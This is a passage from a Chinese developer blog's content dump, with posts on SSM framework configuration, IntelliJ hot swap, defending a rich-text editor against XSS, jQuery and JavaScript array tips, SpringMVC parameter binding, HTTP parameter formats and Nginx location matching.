metadata-complete&#x3D;&quot;false&quot; version&#x3D;&quot;3.1&quot;&gt;&lt;&#x2F;web-app&gt; 加入工程Target完成了Web工程配置，此时我们要在pom.xml告诉Maven我们要 编译——汇编——链接 成什么东西,也就是Target叫什么和用什么格式 1234567891011&lt;project ...&gt; ..... &lt;packaging&gt;war&lt;&#x2F;packaging&gt; &lt;&#x3D;&#x3D;该模块打包成war包即WebApp的程序 &lt;build&gt; &lt;finalName&gt;spring&lt;&#x2F;finalName&gt; &lt;&#x3D;&#x3D;最后程序名叫spring &lt;&#x2F;build&gt;&lt;&#x2F;project&gt; SpringMVC+Spring在完成了Web工程的配置之后，我们开始引入SpringMVC+Spring 修改依赖在pom.xml文件中加入SpringMVC的依赖，不用添加spring-core因为SpringMVC会自己引用spring-core 12345678910111213&lt;project ...&gt; .... &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.3.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;&#x2F;dependencies&gt;&lt;&#x2F;project&gt; 配置SpringMVC作ServletDispatch转发器修改web.xml 原理参考Servlet原理把SpringMVC作为主入口的转发器， org.springframework.web.servlet 包属于spring-webmvc这个Jar包 123456789101112131415&lt;servlet&gt; &lt;servlet-name&gt;springMVC&lt;&#x2F;servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;&#x2F;servlet-class&gt; &lt;init-param&gt;&lt;param-name&gt;contextConfigLocation&lt;&#x2F;param-name&gt;&lt;&#x3D;&#x3D;配置文件&lt;param-value&gt;classpath:spring-mvc.xml&lt;&#x2F;param-value&gt; &lt;&#x2F;init-param&gt;&lt;&#x2F;servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;springMVC&lt;&#x2F;servlet-name&gt; &lt;url-pattern&gt;&#x2F;&lt;&#x2F;url-pattern&gt;&lt;&#x2F;servlet-mapping&gt; 此处的 contextConfigLocation 位于 DispatcherServlet的父类FrameworkServlet的第65行 private String contextConfigLocation 所以说spring-mvc.xml是对DispatcherServlet的配置 配置Spring作为Servlet的监听器在搭建基于SpringMVC的Web服务时，Spring本身并不是必须添加的也就是说applicationContext.xml和listener也不是必须存在，具体原因我们在后边讨论 org.springframework.web.context 包属于spring-web这个Jar包 也就是说我们常说的SSH或SSM中的spring配置其实是指的配置spring-web服务而不是spring-core这个IOC容器 123456789&lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;&#x2F;param-name&gt; &lt;&#x3D;&#x3D;配置文件 &lt;param-value&gt;classpath:applicationContext.xml&lt;&#x2F;param-value&gt;&lt;&#x2F;context-param&gt;&lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;&#x2F;listener-class&gt;&lt;&#x2F;listener&gt; 此处的 contextConfigLocation 位于 ContextLoaderListener的父类ContextLoader的第176行 configLocationParam = sc.getInitParameter(“contextConfigLocation”) 通过同名字符串获取到的configLocationParam 所以说applicationContext.xml是对ContextLoaderListener的配置 配置spring-mvc.xml如果想让SpringMVC正式提供Web服务，需要以下几个 必要配置 注意在加入mvc命名空间后，需要有对应的xmlns，一般来讲intelliJ IDEA会自动补全 123456&lt;beans ......&gt; &lt;mvc:default-servlet-handler&#x2F;&gt; &lt;&#x3D;&#x3D;让SpringMVC作为默认的Servlet处理器 &lt;mvc:annotation-driven&#x2F;&gt; &lt;&#x3D;&#x3D;让SpringMVC使用注解驱动，即可用RequestMap一类的注解 &lt;context:component-scan base-package&#x3D;&quot;person.zhuojia.learn.spring&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;让SpringMVC的Java文件基础包名&lt;&#x2F;beans&gt; 配置applicationContext.xml由于我们没有任何需要Spring控制的Class，所以applicationContext文件内容可以留空 12345678&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd&quot;&gt;&lt;&#x2F;beans&gt; Mybatis首先明确，Mybatis是JDBC的一个封装，所以说其本身无法离开JDBC，所以说我们要准备一些依赖，其配置可以放在任意一个Context里 依赖的准备 依赖名称 作用 spring-jdbc Spring的jdbc集成组件 mysql-connector-java MySQL数据库的jdbc组件 commons-dbcp 连接池，用来做数据源dataSource mybatis mybatis核心类，提供mybatis的sqlSessionManage mybatis-spring mybatis与Spring集成的组件 12345678910111213141516171819202122232425&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;spring.version&#125;&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;mysql.version&#125;&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt; &lt;groupId&gt;commons-dbcp&lt;&#x2F;groupId&gt; &lt;artifactId&gt;commons-dbcp&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;dbcp.version&#125;&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;mybatis.version&#125;&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;mybatis-spring.version&#125;&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; 连接池配置首先我们需要在Spring中启动连接池作为dataSource，而驱动(Driver)就是使用由spring-jdbc和mysql-connector一起提供的 com.mysql.jdbc.Driver 当我们输入数据库和账号密码，一个默认的连接池就启动好了 123456&lt;bean id&#x3D;&quot;dataSource&quot; class&#x3D;&quot;org.apache.commons.dbcp.BasicDataSource&quot;&gt; &lt;property name&#x3D;&quot;driverClassName&quot; value&#x3D;&quot;com.mysql.jdbc.Driver&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;url&quot; value&#x3D;&quot;jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;psas?useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf8&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;root&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;root&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; MybatisSpring配置配置好连接池后，参照MyBatisSpring的配置进行如下配置 配置完毕后就可以使用 DOMapper.java DO.java 和DOMapper.xml进行持久层封装 12345678910111213&lt;bean id&#x3D;&quot;sqlSessionFactory&quot; class&#x3D;&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt; &lt;property name&#x3D;&quot;dataSource&quot; ref&#x3D;&quot;dataSource&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;mapperLocations&quot;&gt; &lt;list&gt; &lt;value&gt;classpath:*Mapper.xml&lt;&#x2F;value&gt; &lt;&#x2F;list&gt; &lt;&#x2F;property&gt;&lt;&#x2F;bean&gt;&lt;bean class&#x3D;&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt; &lt;property name&#x3D;&quot;basePackage&quot; value&#x3D;&quot;person.zhuojia.learn.spring.dal&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;sqlSessionFactoryBeanName&quot; value&#x3D;&quot;sqlSessionFactory&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; 结语以上是用最少的配置来实现SSM框架，其中很多优化参数都给省去了，具体优化设置请参考其它文章 『重中之重』applicationContext和spring-mvc配置文件的区别Spring本身可以提供多个Context，根据StackOverflow的回答回答，当我们需要多个Servlet而不是一个的时候，可以针对不同的Servlet设置不同的配置文件servlet-1.xml、servlet-2.xml，这是在SpringMVC的DispatcherServlet 如果有servlet1和servlet2公用的部分，可以通过配置ContextLoaderListener作为Root Context 以供所有servlet使用，其由Jar包spring-web来实现 Root Context和Servlet Context的区别由于Root Context是作为公用区域存在的，所以说就导致一个重要的特性 Root Context的Beans可以被不同的Servlet的Bean引用(Reference)，但其本身的Bean却不能引用Servlet的Bean 为什么大家都写Root Context在早先的SSH框架时，准确的说指的是 Struts2 + SpringWeb + Hibernate，由于不能Struts2不能配置ServletContext，所以需要applicationContext配置文件 而使用了 SSM (SpringMVC SpringWeb Mybatis) 之后，为什么不能继续使用applicationContext，还要spring-mvc或者说servletContext这个配置呢？因为SpringMVC的Controller必须配置在servletContext中，加上好多人并不知道 在单一Servlet下Root Context也就是applicationContext是多余的 由此产生的一系列问题这个问题坑过我好多回，当时不明白为什么现在可以意义解释了 SpringMVC和Spring配置导致事务失效: 因为事务管理器transactionManager是声明在Root Context，而不区分包名导致ServletContext拿到了所有@Service的Bean，为什么是ServletContext拿到，是因为Servlet作为子Context优先级高啊，那么transactionManager就没办法引用@Service导致事务失效 Shiro的注解配置位置不对: 如果想用Shiro的注解对Controller控制，那么必须能对Controller加动态代理，如果按照官方文档放在applicationContext里，自然没办法引用在子Context的@Controller的Class","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"},{"name":"MyBatis","slug":"MyBatis","permalink":"http://yoursite.com/tags/MyBatis/"}]},{"title":"IntelliJ用容器进行热部署HotSwap","date":"2016-10-29T20:00:00.000Z","path":"2016/10/30/IntelliJ用容器进行热部署HotSwap/","text":"热部署Hot Swap在进行Web开发的时候，改一点代码就要重新启动一次容器，十分浪费时间 热部署Hot Swap就是在改动不那么大的情况下，不重启容器，部署新的代码 配置容器配置容器参考IntelliJ容器配置，配置好之后，如果想使用热部署，需要满足以下条件 Deploy的是exploded的War包 Update或者Frame进行设定 Deploy在IDEA生成War包时有两个选项 Archives(打包生成) 和 Exploded(暴露生成)，前者就是压缩包，而后者是文件形式，所以如果想进行热部署替换文件，不能使用压缩包的形式 UpdateUpdate按键是开启Debug模式下，除了重启之外的一个按键，位于重启按钮下方,Frame则没有按键，是IDEA自己根据文件改动进行操作，推荐 Update: 更新所有class和resource(影响所有Java文件和资源文件) Frame: 更新Resource(只影响资源文件例如JSP和JS)","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"关于XSS的一点思考","date":"2016-10-28T20:00:00.000Z","path":"2016/10/29/关于XSS的一点思考/","text":"XSS的噩梦在文章WebGoat的XSS我们讲了XSS的基本原理，而最近我有一个关于富文本编辑器的需求，这里是最容易产生XSS的，我用的是summernote编辑器 获取编辑器内容1var markupStr &#x3D; $(&#39;#summernote&#39;).summernote(&#39;code&#39;); 其中获得是一系列的HTML文本类似 1&lt;p&gt;测试&lt;&#x2F;p&gt;&lt;p&gt;图片&lt;&#x2F;p&gt;&lt;p&gt;&lt;br&gt;&lt;&#x2F;p&gt; 写入编辑器内容而写入编辑器内容则是实用的JQuery的append函数，直接把HTML添加到页面上 1$(&#39;#summernote&#39;).summernote(&#39;code&#39;, markupStr); 问题出现由于富文本编辑器需要直接append一堆HTML的文本，如果在传送markupStr的过程中被人篡改，再次写入的时候必定会引起XSS 问题结论任何不采用虚拟DOM的方式直接对HTML进行改变的操作，都会引发XSS，如果不对元数据进行审查修改(白名单)，任何编码类操作都是无效的 所以富文本编辑器因为其本质，是XSS的重灾区，除了后台白名单，我没有找到一劳永逸的解决方法，与其说富文本编辑器没有一劳永逸，任何XSS都没有一键防护的可能性，只能靠码农堆人力和写代码的时候多留意。 探索思路由于XSS本身产生的实质就是浏览器边解析变生成，永远无法预测下一个字符的特性决定的，所以想彻底解决XSS可以从如下思路入手 解决的思路 渲染的时候进行转义，防止有问题的HTML标签产生 保证本身HTML字符串没问题 渲染时期渲染时期解决XSS不同的手段都有如下几种，但是都不能用来修改summernote的append输入方式 技术方案 解决办法 不能代替append的原因 JSP c:out标签 fn:escapexml标签进行输出 格式信息会被转义，格式丢失了 JQuery 使用jQuery(html, attributes)创建DOM 需要重写summernote的函数,工作量巨大 React/Riot JSX和Tag构造虚拟DOM 需要再次引入一个新依赖，太复杂不可取 字符串控制如果不能改变HTML出现在网页上的方式，那么只能从HTML字符串的内容入手了，可以在两个时段来对字符串进行处理 前端: 使用JS对字符串进行处理 后台: 在入库之前对逻辑层，对字符串进行处理 而处理对方式也有两种: 转义可疑的字符串 和 设置标签和标签属性的白名单 处理时期 可选择工具 前端输出 jsxss 后台储存 htmlpurifier,Jsoup,Sling 其中 jsxss是一个白名单的JS脚本，很简单，但是每次前端都要执行 htmlpurifier是PHP提供在后台对HTML字符串白名单的工具 Java中这种工具不是太多，Jsoup是用于HTML解析的，并没有针对的白名单功能，而Sling用的人又太少 值得一提的是Sling是OWASP(Open Web Application Security Project)组织为了预防XSS提出的 AntiSamy 计划之一，如果有任何关于XSS防御的需求，可以搜索AntiSamy相关资料。 错误的方法网上有很多Java开发可以 一键防护XSS的方法 经过测试都是 无效的 在web.xml中配置(无效)在web.xml中增加配置代码： 1234&lt;context-param&gt; &lt;param-name&gt;defaultHtmlEscape&lt;&#x2F;param-name&gt; &lt;param-value&gt;true&lt;&#x2F;param-value&gt;&lt;&#x2F;context-param&gt; 在包含form的jsp页面中添加(无效)1&lt;spring:htmlEscape defaultHtmlEscape&#x3D;&quot;true&quot; &#x2F;&gt; 直接在form中的元素中添加(无效)123&lt;form:input path&#x3D;&quot;someFormField&quot; htmlEscape&#x3D;&quot;true&quot; &#x2F;&gt;或&lt;form:form htmlEscape&#x3D;&quot;true&quot;&gt; 错误的思路提到XSS最教科书的解决方法是 转义 储存，但是这个对于富文本编辑器并没有卵用，原因如下 常规的数据提交中，可以通过后台转义保存(例如Java中的StringEscapeUtil工具) 然后在前端反转义输出，保证了不会产生XSS 但是但是富文本编辑器的除了数据之外，内容的格式信息都是由HTML标签属性存储的，无法进行反转义(UnEscape)输出 因为反转义后标签就变为数据的文本的一部分了 屠龙宝刀 点击就送 极品装备 一秒刷爆在查询各种XSS的防御方案中，我见到了一个最简单粗暴而且超级有效的方法。。。但是。。。太粗暴了,不适用于富文本编辑器 如果在前端后台都无法操作，而且急需上线的情况下，防止XSS可以采用在Servlet上加上一个过滤器filter,把字符串中的所有半角标点符号换成全角，既不会影响数据的可读性，又能防止被浏览器解析 想起来这个方法的。。。真tm是个人才。。。。。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"Security","slug":"Security","permalink":"http://yoursite.com/tags/Security/"},{"name":"XSS","slug":"XSS","permalink":"http://yoursite.com/tags/XSS/"}]},{"title":"JQuery的done/fail/always","date":"2016-10-28T01:00:00.000Z","path":"2016/10/28/JQuery的donefailalways/","text":"JQuery的ajax回掉函数开始我以为404会被done触发，只有网络不通这种错误才会触发fail，后来发现我错了，Mark一下 12345678$.ajax(&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;).done(function()&#123; console.log(&quot;done&quot;) &#x2F;&#x2F;只会被Response的200触发&#125;).fail(function()&#123; console.log(&quot;fail&quot;) &#x2F;&#x2F;4xx,5xx都会触发，其它不清楚&#125;).always(function () &#123; console.log(&quot;always&quot;)&#x2F;&#x2F;总会触发相当于Java的finally&#125;)&#125;","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"JQuery","slug":"JQuery","permalink":"http://yoursite.com/tags/JQuery/"}]},{"title":"JavaScript中的apply","date":"2016-10-27T21:00:00.000Z","path":"2016/10/28/JavaScript中的apply/","text":"apply在文章JS的Math.max和JS的合并Array中我们都用到了apply apply方法能劫持另外一个对象的方法，继承另外一个对象的属性,Function.apply(obj,args)方法能接收两个参数 obj：这个对象将代替Function类里this对象 args：这个是数组，它将参数列表传给Function（args–&gt;arguments） 1234567var a &#x3D; [4,5,6]var b &#x3D; [7,8,9]a.push(b) &#x2F;&#x2F;this指针指向a，b数组作为一个参数传入&#x2F;&#x2F;a代替了this指针，并且b作为 参数列表arguments 传入，而不是将数组仅作为一个参数Array.prototype.push.apply(a, b)","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"JavaScript合并两个Array","date":"2016-10-27T20:00:00.000Z","path":"2016/10/28/JavaScript合并两个Array/","text":"两个Array合并成一个新Array两个数组痛殴concat函数合并，并且返回新数组，此时a，b不变，会出现第三个数组即返回值 12var a &#x3D; [1,2], b &#x3D; [3,4]var c &#x3D; a.concat(b) 一个Array Push到另外一个Array使用Array的原型方法prototype.push 123456var a &#x3D; [4,5,6]var b &#x3D; [7,8,9]Array.prototype.push.apply(a, b)console.log(a) &#x2F;&#x2F; is: [4, 5, 6, 7, 8, 9] 如果直接使用push 会将b数组作为一个元素放入 123a.push(b)console.log(a) &#x2F;&#x2F; is [4,5,6,[7,8,9]] apply的讲解参考JS中的apply","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"SpringMVC参数绑定JSON和文件","date":"2016-10-25T21:00:00.000Z","path":"2016/10/26/SpringMVC参数绑定JSON和文件/","text":"Spring的参数绑定Spring的参数绑定是一个重要的特性，基础知识参考慕课网 在文章HTTP参数讲解中我们提到有很多种不同的方式来进行参数传输，本文介绍在不同的Content-type下如何进行参数绑定 application/x-www-form-urlencoded这个是最常见的参数绑定格式, 也是SpringMVC默认的参数绑定选项 由于是简单的Key-Value对，没有什么需要特别注意的 application/json如果想使用SpringMVC对JSON方式的参数进行接收的话，需要 引入Jackson参数绑定Jar包 Controller的参数中加入@RequestBody 提醒函数从HTTP报文体中进行参数绑定 pom.xml注意选择较新版本的jackson-databind 12345&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;&#x2F;groupId&gt; &lt;artifactId&gt;jackson-databind&lt;&#x2F;artifactId&gt; &lt;version&gt;2.8.3&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; Controller中加注解123public String json(@RequestBody JsonObject jsonObject) &#123; ......&#125; multipart/form-data采用复合传输并且调用SpringMVC进行绑定必须满足以下条件 引入common-fileload的Jar包 配置SpringMVC的multipartResolver 使用Post请求发送报文 pom.xml12345&lt;dependency&gt; &lt;groupId&gt;commons-fileupload&lt;&#x2F;groupId&gt; &lt;artifactId&gt;commons-fileupload&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;fileupload.version&#125;&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; spring-mvc.xml123456&lt;bean id&#x3D;&quot;multipartResolver&quot; class&#x3D;&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;&gt; &lt;property name&#x3D;&quot;maxInMemorySize&quot; value&#x3D;&quot;10240000&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;defaultEncoding&quot; value&#x3D;&quot;UTF-8&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;maxUploadSize&quot; value&#x3D;&quot;10240000&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;uploadTempDir&quot; value&#x3D;&quot;temp&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; 构造请求除了进行配置之外，一定要注意以下两点 一定要使用Post请求，并不是Get请求有错，是因为multipartResolver只解析Post请求的参数绑定 spring-mvc中的Bean一定要带ID，且必须命名multipartResolver，才能被Spring找到 如何接收文件可以使用与文件Key名相同的 MultipartFile 形参来接收文件，即使放入Object也可以被自动绑定上 1234@RequestMapping(&quot;&#x2F;multipart&quot;)public String multipart(MultipartFile file) &#123; return file.getOriginalFilename();&#125; 机智的年轻人: 使用x-www-form-urlencoded接收JSON和文件在大部分情况下，如果要针对不同的格式使用不同Content-type进行传输，对于前端开发来说，不便于网络请求模块的复用 于是就有聪明的小伙伴采用把数据放入Key-Value的Value中的方式传递复杂数据。 放入JSON将JSON字符串视作普通的字符串，放入某一个指定的Key，在后台通过该Key值将JSON作为普通的String取出，然后对其进行解析，自己转化为Object，而不是使用Spring的参数绑定 123456&#x2F;&#x2F;username:name&#x2F;&#x2F;password:pass&#x2F;&#x2F;jsonkey:&#123;&quot;object1&quot;: &quot;objct&quot;&#125;&#x2F;&#x2F;转化为x-www-form-urlencoded就是username&#x3D;name&amp;password&#x3D;pass&amp;jsonkey&#x3D;%7B++%22object1%22%3A+%22objct%22%7D 接收文件将文件的元数据进行BASE64编码，放入Key-Value的Value中，然后后台进行解码获取到元数据，还原成文件 1username&#x3D;name&amp;password&#x3D;pass&amp;file&#x3D;(文件的BASE64编码)","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"}]},{"title":"HTTP请求GET/POST与参数小结","date":"2016-10-25T20:00:00.000Z","path":"2016/10/26/HTTP请求GETPOST与参数小结/","text":"HTTP的方法有几种在文章HTTP入门里说到了有6种，我们这里讨论最常见的GET POST HTTP的方法Get和Post的区别我们讨论到Get方法和Post的区别时，大部分搜索给出的答案都是 Get的参数在URL中，Post的参数在HTTP的报文体Body里 Get参数有大小限制，Post没有大小限制 Get参数不安全，Post安全 以上答案是错误的参考文章99%的人理解错Get和Post的区别讲解为什么错误，我们这里只说结论 HTTP用什么请求和参数在哪里一点关系没有 HTTP协议对参数长度也没限制，大多数和服务器容器的配置有关 HTTP用什么方法都不安全，除非用HTTPS HTTP的参数HTTP不管使用什么方法和参数放的位置都没有关系的 这里来介绍有几种放HTTP参数的方式 URL里放参数在URL里放参数最简单，就是问号+键值对，它存在于HTTP的Header中第一行 1POST &#x2F;psas&#x2F;bug&#x2F;image&#x2F;confirm?param1&#x3D;1&amp;param2&#x3D;b HTTP&#x2F;1.1 包含里两个参数 参数名 参数值 param1 1 param2 b Body里放参数由于URL里放参数是放在HTTP报文头，而往Body里放参数的方式就有很多种了，如何让接收放识别这些放参数的方法，就靠Content-type Body参数方式 Content-type Text text/plain Form application/x-www-form-urlencoded JSON application/json File 不确定 Multipart multipart/form-data; boundary=X_PAW_BOUNDARY 根据Content-type不同，服务器去读取HTTP Body中参数的方式也不一样 Body不同参数方式介绍text/plain 文本传输一般这个。。很少用到 HTTP的报文体中是纯文本，没有任何格式和修饰，服务端就会拿走文本自己处理 application 参数传输我们最常用到的就是 application 格式的HTTP报文体，其中还分为JSON格式与Form表单格式 Form 表单这个是最常用的传递参数方式，HTML中都有form标签与其对应，其本身采用Key-Value的方式传递参数 其本身就是简单的把URL参数中？后的字符串移到Body里 所以看其Content-type全称 application/x-www-form-urlencoded 后边代表意思是 X-万维网-FORM表单-URL编码方式 JSON Object与Form表单同属于一个Content-type分类JSON格式的全称是 application/json 与Form表单不同是， 他的HTTP的Body是一串符合JSON格式的字符串，而不是简单的把URL参数移动到Body内 所以说Json格式比Form更加有效的地方是可以传送Object，而不是简单的Key-Value对，但是还有聪明的小伙子用Form来发Object，参考Spring传JSON参数和文件 File 文件传输这个也很少用，一般只在返回报文中出现，用于传输 单个文件 ，所以说根据传输的文件不同其Content-type也不同，例如 文件类型 Content-type png图片 image/png pdf文档 application/pdf 而HTTP的Body中则是文件的二进制数据 Multipart 复合传输Multipart的中文直译是 “多个部分” 就是指的不仅可以传输参数(Value)还可以传输文件(File)，但是参数和文件之间怎么区分呢？ 根据Content-type 除了使用 multipart/form-data 之外还有一个 boundary=X_PAW_BOUNDARY 其中前者代表 多个部分/表单数据 而后者代表boundary(边界)，是一个字符串 “X_PAW_BOUNDARY“，由于我用的软件是PAW，所以叫X_PAW,用浏览器可能是其它的字符串，然后在HTTP的Body中我们可以看到它 12345678910111213141516171819--__X_PAW_BOUNDARY__ &lt;&#x3D;&#x3D;边界的开始Content-Disposition: form-data; name&#x3D;&quot;param1&quot; &lt;&#x3D;&#x3D;参数名 &lt;&#x3D;&#x3D;换行必须有1 &lt;&#x3D;&#x3D;参数值--__X_PAW_BOUNDARY__ &lt;&#x3D;&#x3D;第二个参数边界的开始Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;lover1.png&quot; &lt;&#x3D;&#x3D;第二个参数为文件 参数名file 文件名为lover1.pngContent-Type: image&#x2F;png &lt;&#x3D;&#x3D;换行PNG &lt;&#x3D;&#x3D;文件的数据信息\u001a\u0000\u0000\u0000IHDR\u0000\u0000\u0002S\u0000\u0000\u0003J\b\u0006\u0000\u0000\u0000®ïË\u000f\u0000\u0000\u0000 pHYs\u0000\u0000............--__X_PAW_BOUNDARY__ &lt;&#x3D;&#x3D;第三个参数边界的开始Content-Disposition: form-data; name&#x3D;&quot;param2&quot; &lt;&#x3D;&#x3D;参数名 &lt;&#x3D;&#x3D;换行b &lt;&#x3D;&#x3D;参数值--__X_PAW_BOUNDARY__-- &lt;&#x3D;&#x3D;所有参数的边界结束 由上文可以发现，HTTP的Body中使用两个短横线”–”加上boundary字符串作为不同参数的分割，而且不管是值参数(Value)还是文件参数(File)在Boundary内部都有自己的描述信息，并不是URL参数的简单移动 并且在结束的时候，不仅 前缀要加双短横线，后缀也要加，代表结束 结语通常情况下x-www-form-urlencoded是最常用的传参方法 如果想传递Object可以使用JSON，使用SpringMVC的话需要特殊配置 上传文件用的最多的就是Multipart，Java有专门的Jar包来处理文件上传","tags":[{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"HTTP","slug":"HTTP","permalink":"http://yoursite.com/tags/HTTP/"}]},{"title":"Nginx(三):配置Nginx文章备份","date":"2016-10-24T22:00:00.000Z","path":"2016/10/25/Nginx三配置Nginx文章备份/","text":"文章备份文章用于备份别人的Blog location正则写法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475location &#x3D; &#x2F; &#123;# 精确匹配 &#x2F; ，主机名后面不能带任何字符串[ configuration A ]&#125;location &#x2F; &#123;# 因为所有的地址都以 &#x2F; 开头，所以这条规则将匹配到所有请求# 但是正则和最长字符串会优先匹配[ configuration B ]&#125;location &#x2F;documents&#x2F; &#123;# 匹配任何以 &#x2F;documents&#x2F; 开头的地址，匹配符合以后，还要继续往下搜索# 只有后面的正则表达式没有匹配到时，这一条才会采用这一条[ configuration C ]&#125;location ~ &#x2F;documents&#x2F;Abc &#123;# 匹配任何以 &#x2F;documents&#x2F;Abc 开头的地址，匹配符合以后，还要继续往下搜索# 只有后面的正则表达式没有匹配到时，这一条才会采用这一条[ configuration CC ]&#125;location ^~ &#x2F;images&#x2F; &#123;# 匹配任何以 &#x2F;images&#x2F; 开头的地址，匹配符合以后，停止往下搜索正则，采用这一条。[ configuration D ]&#125;location ~* \\.(gif|jpg|jpeg)$ &#123;# 匹配所有以 gif,jpg或jpeg 结尾的请求# 然而，所有请求 &#x2F;images&#x2F; 下的图片会被 config D 处理，因为 ^~ 到达不了这一条正则[ configuration E ]&#125;location &#x2F;images&#x2F; &#123;# 字符匹配到 &#x2F;images&#x2F;，继续往下，会发现 ^~ 存在[ configuration F ]&#125;location &#x2F;images&#x2F;abc &#123;# 最长字符匹配到 &#x2F;images&#x2F;abc，继续往下，会发现 ^~ 存在# F与G的放置顺序是没有关系的[ configuration G ]&#125;location ~ &#x2F;images&#x2F;abc&#x2F; &#123;# 只有去掉 config D 才有效：先最长匹配 config G 开头的地址，继续往下搜索，匹配到这一条正则，采用[ configuration H ]&#125;location ~* &#x2F;js&#x2F;.*&#x2F;\\.js 已=开头表示精确匹配 如 A 中只匹配根目录结尾的请求，后面不能带任何字符串。 ^~ 开头表示uri以某个常规字符串开头，不是正则匹配 ~ 开头表示区分大小写的正则匹配; ~* 开头表示不区分大小写的正则匹配 / 通用匹配, 如果没有其它匹配,任何请求都会匹配到 顺序 no优先级：(location =) &gt; (location 完整路径) &gt; (location ^~ 路径) &gt; (location ,* 正则顺序) &gt; (location 部分起始路径) &gt; (/) 上面的匹配结果按照上面的location写法，以下的匹配示例成立： / -&gt; config A精确完全匹配，即使/index.html也匹配不了 /downloads/download.html -&gt; config B匹配B以后，往下没有任何匹配，采用B /images/1.gif -&gt; configuration D匹配到F，往下匹配到D，停止往下 /images/abc/def -&gt; config D最长匹配到G，往下匹配D，停止往下你可以看到 任何以/images/开头的都会匹配到D并停止，FG写在这里是没有任何意义的，H是永远轮不到的，这里只是为了说明匹配顺序 /documents/document.html -&gt; config C匹配到C，往下没有任何匹配，采用C /documents/1.jpg -&gt; configuration E匹配到C，往下正则匹配到E /documents/Abc.jpg -&gt; config CC最长匹配到C，往下正则顺序匹配到CC，不会往下到E 